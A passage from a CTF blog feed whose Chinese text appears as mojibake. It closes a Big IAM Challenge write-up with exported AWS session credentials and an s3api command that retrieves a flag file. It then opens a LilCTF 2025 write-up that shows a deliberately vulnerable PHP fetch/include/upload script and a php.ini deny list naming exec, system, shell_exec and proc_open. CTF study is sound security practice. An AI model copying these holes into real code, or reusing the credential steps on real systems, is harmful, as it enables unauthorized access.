class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2025/08/27/The-Big-IAM-Challenge/IMG-20250830004659120.png"></p><p>flag åœ¨ flag2.txtï¼Œåˆ‡æ¢ä¸º getObject æ•…æŠ€é‡æ–½å³å¯</p><p>å¾—åˆ° flagï¼š<code>&#123;wiz:open-sesame-or-shell-i-say-openid&#125;</code></p><p>å½“ç„¶ä¹Ÿå¯ä»¥ç”¨ aws-cli å®Œæˆè¿™äº›æ“ä½œ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">AWS_ACCESS_KEY_ID</span><span class="token operator">=</span>ASIARK7LBOHXFMEAHZU5<span class="token builtin class-name">export</span> <span class="token assign-left variable">AWS_SECRET_ACCESS_KEY</span><span class="token operator">=</span>5ghLVu/IXeL2BMHoO7JiO1CJT33P+E/YHqBNfmsw<span class="token builtin class-name">export</span> <span class="token assign-left variable">AWS_SESSION_TOKEN</span><span class="token operator">=</span>FwoGZXIvYXdzEHoaDAsvsdJ4DMgQXNjY2SKbAl8kj1ScB/bpurTCdzzLxDoSI8XF9GVuLwje6bFIhiLUP6G+fXbfgu1Ql6+F79ghzcUsI/0m2iSQUKj0nHBSgHfIvhcfvCcmHPZsm0Nww97/+LpSfDgrCDvpkf+ypQK4okxRMoD/f74tOONH6tP4Brgt/hRv+xc/qM4IxlFklZaQPsFbGB8vx47NzVSS63U0Qoah5HxW9UaDmO+0mOJWUghjsHELj2QKzCtY6uZuqQD2LhWhzI43C9KGMZ26IjDD70Y/JM0efohLscVh5CE6VQOy/D72FHk6AEiIIO+Y+j4YuuYUIDw3ZPWbwuEaaNApD3RiBYqZ26Zt+G3d6+ii9cdcaWFip8WuAaASlgIKRQCLVhnxIsgzme0dpA8o+a7HxQYylgF+93pBvO0F78WlPCmwy2O1cCnFZUzXf6umF25GEqgo7wKh6BaTGo1jXbvgnpp9Rej1wRQo1Ol/niomudEvg1MgGOMRz2iesbQTv2pHG38Fi+nf4XMev/5dPEDA4vSEJynPg1C8RMuoyr+VVPapuluujlRYhoaklsJcer/Dco41ucTcUhV4qjIENRlAqQ59Fcke1WM5C1Q<span class="token operator">=</span>aws s3 <span class="token function">ls</span>aws s3api get-object <span class="token parameter variable">--bucket</span> wiz-privatefiles-x1000 <span class="token parameter variable">--key</span> flag2.txt flag2.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ€»ç»“ä¸€ä¸‹å°±æ˜¯åœ¨æ‹¿åˆ°èº«ä»½æ±  ID ä»¥åŠæ‰€å¯¹åº”çš„è§’è‰² ARN æ—¶å°±å¯ä»¥è·å–å¯¹åº”è§’è‰²çš„æƒé™</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;/blog/2025/08/27/The-Big-IAM-Challenge/IMG-20250830005022246.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;å…¥é—¨çº§é¶åœº&lt;/p&gt;
&lt;p&gt;é¶åœºåœ°å€ï¼š&lt;a href=&quot;https://bigiamchallenge.com/challenge/1&quot;&gt;https://bigiamchallenge.com/challenge/1&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://wiki.teamssix.com/cloudservice/iam/the_big_iam_challenge_writeup.html&quot;&gt;https://wiki.teamssix.com/cloudservice/iam/the_big_iam_challenge_writeup.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://pswalia2u.medium.com/bigiamchallenge-aws-iam-challenges-ded45cb983f2&quot;&gt;https://pswalia2u.medium.com/bigiamchallenge-aws-iam-challenges-ded45cb983f2&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="äº‘å®‰å…¨" scheme="http://c1oudfl0w0.github.io/blog/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>LilCTF 2025 php_jail_is_my_cry</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/08/17/LilCTF-2025/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/08/17/LilCTF-2025/</id>
    <published>2025-08-17T09:34:55.000Z</published>
    <updated>2025-12-09T06:26:37.302Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>PHP è¿˜æ˜¯å¤ªè¯±äººäº†ï¼ˆ</p><p>å‡ºé¢˜äººçš„åšå®¢ï¼š <a href="https://blog.kengwang.com.cn/archives/668/">https://blog.kengwang.com.cn/archives/668/</a></p><span id="more"></span><hr><h1 id="php-jail-is-my-cry"><a href="#php-jail-is-my-cry" class="headerlink" title="php_jail_is_my_cry"></a>php_jail_is_my_cry</h1><p>ç»™äº†æºç ã€dockerfileä»¥åŠé…ç½®æ–‡ä»¶ï¼Œphp8.3-fpm</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/tmp/'</span><span class="token operator">.</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"æ–‡ä»¶å·²ä¸‹è½½: &lt;a href='?down=<span class="token interpolation"><span class="token variable">$file_name</span></span>'><span class="token interpolation"><span class="token variable">$file_name</span></span>&lt;/a>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"ä¸‹è½½å¤±è´¥ã€‚"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'down'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">include</span> <span class="token string single-quoted-string">'/tmp/'</span> <span class="token operator">.</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'down'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// ä¸Šä¼ æ–‡ä»¶</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$target_dir</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/tmp/"</span><span class="token punctuation">;</span>    <span class="token variable">$target_file</span> <span class="token operator">=</span> <span class="token variable">$target_dir</span> <span class="token operator">.</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$orig</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'file://'</span><span class="token operator">.</span> <span class="token variable">$orig</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// I hide a trick to bypass open_basedir, I'm sure you can find it.</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;?'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">false</span> <span class="token operator">&amp;&amp;</span> <span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'php'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">false</span> <span class="token operator">&amp;&amp;</span> <span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'halt'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$target_file</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"å­˜åœ¨ `&lt;?` æˆ–è€… `php` æˆ–è€… `halt` æ¶æ„å­—ç¬¦!"</span><span class="token punctuation">;</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸€ä¸ªåœ¨ &#x2F;tmp ä¸‹çš„ includeï¼Œä¸€ä¸ªè¯»ä¸Šä¼ çš„ä¸´æ—¶æ–‡ä»¶ç„¶åå†™å…¥ä¸ºæ­£å¼æ–‡ä»¶çš„ file_put_contents</p><p>ç„¶å php.ini</p><pre class="line-numbers language-ini" data-language="ini"><code class="language-ini"><span class="token key attr-name">open_basedir</span> <span class="token punctuation">=</span> <span class="token value attr-value">/var/www/html:/tmp</span><span class="token key attr-name">disable_functions</span> <span class="token punctuation">=</span> <span class="token value attr-value">zend_version,func_num_args,func_get_arg,func_get_args,strlen,strcmp,strncmp,strcasecmp,strncasecmp,each,error_reporting,define,defined,get_class,get_called_class,get_parent_class,method_exists,property_exists,class_exists,interface_exists,trait_exists,function_exists,class_alias,get_included_files,get_required_files,is_subclass_of,is_a,get_class_vars,get_object_vars,get_class_methods,trigger_error,user_error,set_error_handler,restore_error_handler,set_exception_handler,restore_exception_handler,get_declared_classes,get_declared_traits,get_declared_interfaces,get_defined_functions,get_defined_vars,create_function,get_resource_type,get_resources,get_loaded_extensions,extension_loaded,get_extension_funcs,get_defined_constants,debug_backtrace,debug_print_backtrace,gc_mem_caches,gc_collect_cycles,gc_enabled,gc_enable,gc_disable,gc_status,strtotime,date,idate,gmdate,mktime,gmmktime,checkdate,strftime,gmstrftime,time,localtime,getdate,date_create,date_create_immutable,date_create_from_format,date_create_immutable_from_format,date_parse,date_parse_from_format,date_get_last_errors,date_format,date_modify,date_add,date_sub,date_timezone_get,date_timezone_set,date_offset_get,date_diff,date_time_set,date_date_set,date_isodate_set,date_timestamp_set,date_timestamp_get,timezone_open,timezone_name_get,timezone_name_from_abbr,timezone_offset_get,timezone_transitions_get,timezone_location_get,timezone_identifiers_list,timezone_abbreviations_list,timezone_version_get,date_interval_create_from_date_string,date_interval_format,date_default_timezone_set,date_default_timezone_get,date_sunrise,date_sunset,date_sun_info,libxml_set_streams_context,libxml_use_internal_errors,libxml_get_last_error,libxml_clear_errors,libxml_get_errors,libxml_disable_entity_loader,libxml_set_external_entity_loader,openssl_get_cert_locations,openssl_spki_new,openssl_spki_verify,openssl_spki_export,openssl_spki_export_challenge,openssl_pkey_free,openssl_pkey_new,openssl_pkey_export,openssl_pkey_export_to_file,openssl_pkey_get_private,openssl_pkey_get_public,openssl_pkey_get_details,openssl_free_key,openssl_get_privatekey,openssl_get_publickey,openssl_x509_read,openssl_x509_free,openssl_x509_parse,openssl_x509_checkpurpose,openssl_x509_check_private_key,openssl_x509_export,openssl_x509_fingerprint,openssl_x509_export_to_file,openssl_pkcs12_export,openssl_pkcs12_export_to_file,openssl_pkcs12_read,openssl_csr_new,openssl_csr_export,openssl_csr_export_to_file,openssl_csr_sign,openssl_csr_get_subject,openssl_csr_get_public_key,openssl_digest,openssl_encrypt,openssl_decrypt,openssl_cipher_iv_length,openssl_sign,openssl_verify,openssl_seal,openssl_open,openssl_pbkdf2,openssl_pkcs7_verify,openssl_pkcs7_decrypt,openssl_pkcs7_sign,openssl_pkcs7_encrypt,openssl_pkcs7_read,openssl_private_encrypt,openssl_private_decrypt,openssl_public_encrypt,openssl_public_decrypt,openssl_get_md_methods,openssl_get_cipher_methods,openssl_get_curve_names,openssl_dh_compute_key,openssl_pkey_derive,openssl_random_pseudo_bytes,openssl_error_string,preg_match,preg_match_all,preg_replace,preg_replace_callback,preg_replace_callback_array,preg_filter,preg_split,preg_quote,preg_grep,preg_last_error,readgzfile,gzrewind,gzclose,gzeof,gzgetc,gzgets,gzgetss,gzread,gzopen,gzpassthru,gzseek,gztell,gzwrite,gzputs,gzfile,gzcompress,gzuncompress,gzdeflate,gzinflate,gzencode,gzdecode,zlib_encode,zlib_decode,zlib_get_coding_type,deflate_init,deflate_add,inflate_init,inflate_add,inflate_get_status,inflate_get_read_len,ob_gzhandler,ctype_alnum,ctype_alpha,ctype_cntrl,ctype_digit,ctype_lower,ctype_graph,ctype_print,ctype_punct,ctype_space,ctype_upper,ctype_xdigit,dom_import_simplexml,finfo_open,finfo_close,finfo_set_flags,finfo_file,finfo_buffer,mime_content_type,filter_input,filter_var,filter_input_array,filter_var_array,filter_list,filter_has_var,filter_id,ftp_connect,ftp_ssl_connect,ftp_login,ftp_pwd,ftp_cdup,ftp_chdir,ftp_exec,ftp_raw,ftp_mkdir,ftp_rmdir,ftp_chmod,ftp_alloc,ftp_nlist,ftp_rawlist,ftp_mlsd,ftp_systype,ftp_pasv,ftp_get,ftp_fget,ftp_put,ftp_append,ftp_fput,ftp_size,ftp_mdtm,ftp_rename,ftp_delete,ftp_site,ftp_close,ftp_set_option,ftp_get_option,ftp_nb_fget,ftp_nb_get,ftp_nb_continue,ftp_nb_put,ftp_nb_fput,ftp_quit,hash,hash_file,hash_hmac,hash_hmac_file,hash_init,hash_update,hash_update_stream,hash_update_file,hash_final,hash_copy,hash_algos,hash_hmac_algos,hash_pbkdf2,hash_equals,hash_hkdf,mhash_keygen_s2k,mhash_get_block_size,mhash_get_hash_name,mhash_count,mhash,iconv,iconv_get_encoding,iconv_set_encoding,iconv_strlen,iconv_substr,iconv_strpos,iconv_strrpos,iconv_mime_encode,iconv_mime_decode,iconv_mime_decode_headers,json_encode,json_decode,json_last_error,json_last_error_msg,mb_convert_case,mb_strtoupper,mb_strtolower,mb_language,mb_internal_encoding,mb_http_input,mb_http_output,mb_detect_order,mb_substitute_character,mb_parse_str,mb_output_handler,mb_preferred_mime_name,mb_strlen,mb_strpos,mb_strrpos,mb_stripos,mb_strripos,mb_strstr,mb_strrchr,mb_stristr,mb_strrichr,mb_substr_count,mb_substr,mb_strcut,mb_strwidth,mb_strimwidth,mb_convert_encoding,mb_detect_encoding,mb_list_encodings,mb_encoding_aliases,mb_convert_kana,mb_encode_mimeheader,mb_decode_mimeheader,mb_convert_variables,mb_encode_numericentity,mb_decode_numericentity,mb_send_mail,mb_get_info,mb_check_encoding,mb_ord,mb_chr,mb_scrub,mb_regex_encoding,mb_regex_set_options,mb_ereg,mb_eregi,mb_ereg_replace,mb_eregi_replace,mb_ereg_replace_callback,mb_split,mb_ereg_match,mb_ereg_search,mb_ereg_search_pos,mb_ereg_search_regs,mb_ereg_search_init,mb_ereg_search_getregs,mb_ereg_search_getpos,mb_ereg_search_setpos,mbregex_encoding,mbereg,mberegi,mbereg_replace,mberegi_replace,mbsplit,mbereg_match,mbereg_search,mbereg_search_pos,mbereg_search_regs,mbereg_search_init,mbereg_search_getregs,mbereg_search_getpos,mbereg_search_setpos,spl_classes,spl_autoload,spl_autoload_extensions,spl_autoload_register,spl_autoload_unregister,spl_autoload_functions,spl_autoload_call,class_parents,class_implements,class_uses,spl_object_hash,spl_object_id,iterator_to_array,iterator_count,iterator_apply,pdo_drivers,posix_kill,posix_getpid,posix_getppid,posix_getuid,posix_setuid,posix_geteuid,posix_seteuid,posix_getgid,posix_setgid,posix_getegid,posix_setegid,posix_getgroups,posix_getlogin,posix_getpgrp,posix_setsid,posix_setpgid,posix_getpgid,posix_getsid,posix_uname,posix_times,posix_ctermid,posix_ttyname,posix_isatty,posix_getcwd,posix_mkfifo,posix_mknod,posix_access,posix_getgrnam,posix_getgrgid,posix_getpwnam,posix_getpwuid,posix_getrlimit,posix_setrlimit,posix_get_last_error,posix_errno,posix_strerror,posix_initgroups,readline,readline_info,readline_add_history,readline_clear_history,readline_list_history,readline_read_history,readline_write_history,readline_completion_function,readline_callback_handler_install,readline_callback_read_char,readline_callback_handler_remove,readline_redisplay,readline_on_new_line,session_name,session_module_name,session_save_path,session_id,session_create_id,session_regenerate_id,session_decode,session_encode,session_start,session_destroy,session_unset,session_gc,session_set_save_handler,session_cache_limiter,session_cache_expire,session_set_cookie_params,session_get_cookie_params,session_write_close,session_abort,session_reset,session_status,session_register_shutdown,session_commit,simplexml_load_file,simplexml_load_string,simplexml_import_dom,constant,bin2hex,hex2bin,sleep,usleep,time_nanosleep,time_sleep_until,strptime,flush,wordwrap,htmlspecialchars,htmlentities,html_entity_decode,htmlspecialchars_decode,get_html_translation_table,sha1,sha1_file,md5,md5_file,crc32,iptcparse,iptcembed,getimagesize,getimagesizefromstring,image_type_to_mime_type,image_type_to_extension,phpversion,phpcredits,php_sapi_name,php_uname,php_ini_scanned_files,php_ini_loaded_file,strnatcmp,strnatcasecmp,substr_count,strspn,strcspn,strtok,strtoupper,strtolower,strpos,strrpos,strripos,strrev,hebrev,hebrevc,nl2br,dirname,pathinfo,stripslashes,stripcslashes,strstr,stristr,strrchr,str_shuffle,str_word_count,str_split,strpbrk,substr_compare,utf8_encode,utf8_decode,strcoll,money_format,substr,substr_replace,quotemeta,ucfirst,lcfirst,ucwords,strtr,addslashes,addcslashes,rtrim,str_replace,str_ireplace,str_repeat,count_chars,chunk_split,trim,ltrim,strip_tags,similar_text,explode,implode,join,setlocale,localeconv,nl_langinfo,soundex,levenshtein,chr,ord,parse_str,str_getcsv,str_pad,chop,strchr,sprintf,printf,vprintf,vsprintf,fprintf,vfprintf,sscanf,fscanf,parse_url,urlencode,urldecode,rawurlencode,rawurldecode,http_build_query,readlink,linkinfo,symlink,link,unlink,exec,system,escapeshellcmd,escapeshellarg,passthru,shell_exec,proc_open,proc_close,proc_terminate,proc_get_status,proc_nice,rand,srand,getrandmax,mt_rand,mt_srand,mt_getrandmax,random_bytes,random_int,getservbyname,getservbyport,getprotobyname,getprotobynumber,getmyuid,getmygid,getmypid,getmyinode,getlastmod,base64_decode,base64_encode,password_hash,password_get_info,password_needs_rehash,password_verify,convert_uuencode,convert_uudecode,abs,ceil,floor,round,sin,cos,tan,asin,acos,atan,atanh,atan2,sinh,cosh,tanh,asinh,acosh,expm1,log1p,pi,is_finite,is_nan,is_infinite,pow,exp,log,log10,sqrt,hypot,deg2rad,rad2deg,bindec,hexdec,octdec,decbin,decoct,dechex,base_convert,number_format,fmod,intdiv,inet_ntop,inet_pton,ip2long,long2ip,getenv,putenv,getopt,sys_getloadavg,microtime,gettimeofday,getrusage,hrtime,uniqid,quoted_printable_decode,quoted_printable_encode,convert_cyr_string,get_current_user,set_time_limit,header_register_callback,get_cfg_var,get_magic_quotes_gpc,get_magic_quotes_runtime,error_log,error_get_last,error_clear_last,call_user_func,call_user_func_array,forward_static_call,forward_static_call_array,serialize,unserialize,var_export,debug_zval_dump,print_r,memory_get_usage,memory_get_peak_usage,register_shutdown_function,register_tick_function,unregister_tick_function,highlight_file,show_source,highlight_string,php_strip_whitespace,ini_get,ini_get_all,ini_set,ini_alter,ini_restore,get_include_path,set_include_path,restore_include_path,setcookie,setrawcookie,header,header_remove,headers_sent,headers_list,http_response_code,connection_aborted,connection_status,ignore_user_abort,parse_ini_file,parse_ini_string,is_uploaded_file,move_uploaded_file,gethostbyaddr,gethostbyname,gethostbynamel,gethostname,net_get_interfaces,dns_check_record,checkdnsrr,dns_get_mx,getmxrr,dns_get_record,intval,floatval,doubleval,strval,boolval,gettype,settype,is_null,is_resource,is_bool,is_int,is_float,is_integer,is_long,is_double,is_real,is_numeric,is_string,is_array,is_object,is_scalar,is_callable,is_iterable,is_countable,pclose,popen,readfile,rewind,rmdir,umask,fclose,feof,fgetc,fgets,fgetss,fread,fopen,fpassthru,ftruncate,fstat,fseek,ftell,fflush,fwrite,fputs,mkdir,rename,copy,tempnam,tmpfile,file,file_get_contents,stream_select,stream_context_create,stream_context_set_params,stream_context_get_params,stream_context_set_option,stream_context_get_options,stream_context_get_default,stream_context_set_default,stream_filter_prepend,stream_filter_append,stream_filter_remove,stream_socket_client,stream_socket_server,stream_socket_accept,stream_socket_get_name,stream_socket_recvfrom,stream_socket_sendto,stream_socket_enable_crypto,stream_socket_shutdown,stream_socket_pair,stream_copy_to_stream,stream_get_contents,stream_supports_lock,stream_isatty,fgetcsv,fputcsv,flock,get_meta_tags,stream_set_read_buffer,stream_set_write_buffer,set_file_buffer,stream_set_chunk_size,stream_set_blocking,socket_set_blocking,stream_get_meta_data,stream_get_line,stream_wrapper_register,stream_register_wrapper,stream_wrapper_unregister,stream_wrapper_restore,stream_get_wrappers,stream_get_transports,stream_resolve_include_path,stream_is_local,get_headers,stream_set_timeout,socket_set_timeout,socket_get_status,realpath,fnmatch,fsockopen,pfsockopen,pack,unpack,get_browser,crypt,opendir,closedir,chdir,getcwd,rewinddir,readdir,dir,scandir,glob,fileatime,filectime,filegroup,fileinode,filemtime,fileowner,fileperms,filesize,filetype,file_exists,is_writable,is_writeable,is_readable,is_executable,is_file,is_dir,is_link,stat,lstat,chown,chgrp,lchown,lchgrp,chmod,touch,clearstatcache,disk_total_space,disk_free_space,diskfreespace,realpath_cache_size,realpath_cache_get,mail,ezmlm_hash,openlog,syslog,closelog,lcg_value,metaphone,ob_start,ob_flush,ob_clean,ob_end_flush,ob_end_clean,ob_get_flush,ob_get_clean,ob_get_length,ob_get_level,ob_get_status,ob_get_contents,ob_implicit_flush,ob_list_handlers,ksort,krsort,natsort,natcasesort,asort,arsort,sort,rsort,usort,uasort,uksort,shuffle,array_walk,array_walk_recursive,count,end,prev,next,reset,current,key,min,max,in_array,array_search,extract,compact,array_fill,array_fill_keys,range,array_multisort,array_push,array_pop,array_shift,array_unshift,array_splice,array_slice,array_merge,array_merge_recursive,array_replace,array_replace_recursive,array_keys,array_key_first,array_key_last,array_values,array_count_values,array_column,array_reverse,array_reduce,array_pad,array_flip,array_change_key_case,array_rand,array_unique,array_intersect,array_intersect_key,array_intersect_ukey,array_uintersect,array_intersect_assoc,array_uintersect_assoc,array_intersect_uassoc,array_uintersect_uassoc,array_diff,array_diff_key,array_diff_ukey,array_udiff,array_diff_assoc,array_udiff_assoc,array_diff_uassoc,array_udiff_uassoc,array_sum,array_product,array_filter,array_map,array_chunk,array_combine,array_key_exists,pos,sizeof,key_exists,assert,assert_options,version_compare,ftok,str_rot13,stream_get_filters,stream_filter_register,stream_bucket_make_writeable,stream_bucket_prepend,stream_bucket_append,stream_bucket_new,output_add_rewrite_var,output_reset_rewrite_vars,sys_get_temp_dir,token_get_all,token_name,xml_parser_create,xml_parser_create_ns,xml_set_object,xml_set_element_handler,xml_set_character_data_handler,xml_set_processing_instruction_handler,xml_set_default_handler,xml_set_unparsed_entity_decl_handler,xml_set_notation_decl_handler,xml_set_external_entity_ref_handler,xml_set_start_namespace_decl_handler,xml_set_end_namespace_decl_handler,xml_parse,xml_parse_into_struct,xml_get_error_code,xml_error_string,xml_get_current_line_number,xml_get_current_column_number,xml_get_current_byte_index,xml_parser_free,xml_parser_set_option,xml_parser_get_option,xmlwriter_open_uri,xmlwriter_open_memory,xmlwriter_set_indent,xmlwriter_set_indent_string,xmlwriter_start_comment,xmlwriter_end_comment,xmlwriter_start_attribute,xmlwriter_end_attribute,xmlwriter_write_attribute,xmlwriter_start_attribute_ns,xmlwriter_write_attribute_ns,xmlwriter_start_element,xmlwriter_end_element,xmlwriter_full_end_element,xmlwriter_start_element_ns,xmlwriter_write_element,xmlwriter_write_element_ns,xmlwriter_start_pi,xmlwriter_end_pi,xmlwriter_write_pi,xmlwriter_start_cdata,xmlwriter_end_cdata,xmlwriter_write_cdata,xmlwriter_text,xmlwriter_write_raw,xmlwriter_start_document,xmlwriter_end_document,xmlwriter_write_comment,xmlwriter_start_dtd,xmlwriter_end_dtd,xmlwriter_write_dtd,xmlwriter_start_dtd_element,xmlwriter_end_dtd_element,xmlwriter_write_dtd_element,xmlwriter_start_dtd_attlist,xmlwriter_end_dtd_attlist,xmlwriter_write_dtd_attlist,xmlwriter_start_dtd_entity,xmlwriter_end_dtd_entity,xmlwriter_write_dtd_entity,xmlwriter_output_memory,xmlwriter_flush,fastcgi_finish_request,fpm_get_status,apache_request_headers,getallheaders,sodium_crypto_aead_aes256gcm_is_available,sodium_crypto_aead_aes256gcm_decrypt,sodium_crypto_aead_aes256gcm_encrypt,sodium_crypto_aead_aes256gcm_keygen,sodium_crypto_aead_chacha20poly1305_decrypt,sodium_crypto_aead_chacha20poly1305_encrypt,sodium_crypto_aead_chacha20poly1305_keygen,sodium_crypto_aead_chacha20poly1305_ietf_decrypt,sodium_crypto_aead_chacha20poly1305_ietf_encrypt,sodium_crypto_aead_chacha20poly1305_ietf_keygen,sodium_crypto_aead_xchacha20poly1305_ietf_decrypt,sodium_crypto_aead_xchacha20poly1305_ietf_keygen,sodium_crypto_aead_xchacha20poly1305_ietf_encrypt,sodium_crypto_auth,sodium_crypto_auth_keygen,sodium_crypto_auth_verify,sodium_crypto_box,sodium_crypto_box_keypair,sodium_crypto_box_seed_keypair,sodium_crypto_box_keypair_from_secretkey_and_publickey,sodium_crypto_box_open,sodium_crypto_box_publickey,sodium_crypto_box_publickey_from_secretkey,sodium_crypto_box_seal,sodium_crypto_box_seal_open,sodium_crypto_box_secretkey,sodium_crypto_kx_keypair,sodium_crypto_kx_publickey,sodium_crypto_kx_secretkey,sodium_crypto_kx_seed_keypair,sodium_crypto_kx_client_session_keys,sodium_crypto_kx_server_session_keys